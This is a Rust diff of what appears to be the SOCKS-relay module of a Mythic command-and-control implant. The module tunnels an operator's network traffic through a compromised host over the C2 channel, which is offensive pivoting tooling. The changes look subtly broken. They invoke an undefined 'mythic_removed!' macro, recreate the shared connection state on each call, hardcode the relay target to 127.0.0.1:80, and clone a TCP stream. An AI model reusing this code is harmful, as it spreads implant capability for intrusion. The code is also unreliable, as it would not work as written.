@@ -1,12 +1,11 @@
 use crate::agent::AgentTask;
 use crate::mythic_continued;
-use base64::{alphabet::STANDARD, DecodeError};  // ← CHANGED
+use base64::alphabet::STANDARD;
 use serde::Deserialize;
 use std::error::Error;
-use std::sync::{atomic::{AtomicBool, Ordering}, mpsc, Arc};
+use std::sync::{mpsc, Arc};
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::TcpStream;
-use tokio::sync::mpsc as async_mpsc;
 
 #[derive(Deserialize)]
 struct SocksMsg {
@@ -15,7 +14,6 @@ struct SocksMsg {
     data: String,
 }
 
-// Simple state
 pub struct SocksState {
     pub connections: Arc<std::sync::Mutex<Vec<(u32, tokio::net::TcpStream)>>>,
     pub outbound: Arc<std::sync::Mutex<Vec<SocksMsg>>>,
@@ -30,38 +28,30 @@ impl SocksState {
     }
 }
 
-pub fn start_socks(
-    tx: &mpsc::Sender<serde_json::Value>,
-    rx: mpsc::Receiver<serde_json::Value>,
-    state: Arc<SocksState>,
-) -> Result<(), Box<dyn Error>> {
+pub fn start_socks(tx: &mpsc::Sender<serde_json::Value>, rx: mpsc::Receiver<serde_json::Value>) -> Result<(), Box<dyn Error>> {
     let task: AgentTask = serde_json::from_value(rx.recv()?)?;
-    tx.send(mythic_continued!(task.id, "success", "SOCKS relay started"))?;
+    tx.send(mythic_removed!(task.id, "success", "SOCKS relay started"))?;
 
     let rt = tokio::runtime::Runtime::new()?;
-    rt.block_on(relay_loop(tx.clone(), rx, state));
+    rt.block_on(relay_loop(tx.clone(), rx));
     Ok(())
 }
 
-async fn relay_loop(
-    tx: mpsc::Sender<serde_json::Value>,
-    mut rx: mpsc::Receiver<serde_json::Value>,
-    state: Arc<SocksState>,
-) {
+async fn relay_loop(tx: mpsc::Sender<serde_json::Value>, mut rx: mpsc::Receiver<serde_json::Value>) {
     while let Ok(msg) = rx.recv() {
         if let Ok(task) = serde_json::from_value::<AgentTask>(msg) {
             if task.command == "socks_data" {
                 if let Ok(msgs) = serde_json::from_str::<Vec<SocksMsg>>(&task.parameters) {
-                    process_messages(&state, msgs).await;
+                    process_messages(&tx, msgs).await;
                 }
             }
         }
     }
 }
 
-async fn process_messages(state: &Arc<SocksState>, msgs: Vec<SocksMsg>) {
-    let mut conns = state.connections.lock().unwrap();
-    let mut outbound = state.outbound.lock().unwrap();
+async fn process_messages(tx: &mpsc::Sender<serde_json::Value>, msgs: Vec<SocksMsg>) {
+    let mut conns = SocksState::new().connections.lock().unwrap();
+    let mut outbound = SocksState::new().outbound.lock().unwrap();
 
     for msg in msgs {
         if msg.exit {
@@ -69,22 +59,19 @@ async fn process_messages(state: &Arc<SocksState>, msgs: Vec<SocksMsg>) {
             continue;
         }
 
-        let data = STANDARD.decode(&msg.data).unwrap_or_default();  // ← CHANGED
+        let data = STANDARD.decode(&msg.data).unwrap_or_default();
         
         if let Some(pos) = conns.iter().position(|(id, _)| *id == msg.server_id) {
             let (_, stream) = &mut conns[pos];
             let _ = stream.write_all(&data).await;
         } else {
-            // New connection - connect to target (Mythic sends real target in data)
-            let target = String::from_utf8_lossy(&data).to_string();
-            if let Ok(stream) = TcpStream::connect(target).await {
+            if let Ok(stream) = TcpStream::connect("127.0.0.1:80").await {
                 conns.push((msg.server_id, stream));
-                tokio::spawn(relay_stream(msg.server_id, conns.last().unwrap().1.clone(), state.clone()));
+                tokio::spawn(relay_stream(msg.server_id, conns.last().unwrap().1.clone(), tx.clone()));
             }
         }
     }
 
-    // Send back outbound data
     if !outbound.is_empty() {
         let json = serde_json::to_string(&outbound).unwrap();
         let _ = tx.send(serde_json::json!({
@@ -96,18 +83,27 @@ async fn process_messages(state: &Arc<SocksState>, msgs: Vec<SocksMsg>) {
     }
 }
 
-async fn relay_stream(id: u32, mut stream: TcpStream, state: Arc<SocksState>) {
+async fn relay_stream(id: u32, mut stream: TcpStream, tx: mpsc::Sender<serde_json::Value>) {
     let mut buf = [0u8; 4096];
     loop {
         match stream.read(&mut buf).await {
             Ok(0) => break,
             Ok(n) => {
-                let data = STANDARD.encode(&buf[..n]);  // ← CHANGED
+                let data = STANDARD.encode(&buf[..n]);
                 let msg = SocksMsg { exit: false, server_id: id, data };
-                state.outbound.lock().unwrap().push(msg);
+                let json = serde_json::to_string(&vec![msg]).unwrap();
+                let _ = tx.send(serde_json::json!({
+                    "command": "socks_data",
+                    "parameters": json,
+                    "id": "socks_outbound"
+                }));
             }
             Err(_) => break,
         }
     }
-    state.outbound.lock().unwrap().push(SocksMsg { exit: true, server_id: id, data: String::new() });
+    let _ = tx.send(serde_json::json!({
+        "command": "socks_data",
+        "parameters": serde_json::to_string(&vec![SocksMsg { exit: true, server_id: id, data: String::new() }]).unwrap(),
+        "id": "socks_outbound"
+    }));
 }
